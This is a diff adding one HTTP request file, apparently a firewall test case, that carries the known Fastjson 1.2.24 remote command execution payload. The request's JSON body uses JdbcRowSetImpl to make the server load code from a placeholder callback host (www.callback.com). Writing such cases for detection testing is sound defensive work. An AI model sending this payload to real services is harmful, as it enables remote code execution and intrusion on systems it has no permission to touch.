@@ -1,0 +1,17 @@
+# 利用【Fastjson_1.2.24远程命令执行漏洞执行命令】-30000107
+# 利用Fastjson_1.2.24远程命令执行漏洞执行任意命令。
+POST /?acid=30000107&bid=hd_tag_m8mv25b0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25b0
+RM-PRO-Token: 0438a6ffd7362f74fef7d1eaaa2c01cf
+RM-PRO-Time: 1742808456583
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+      "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://http://www.callback.com/Exploit",
+                "autoCommit":true
+            }
+}
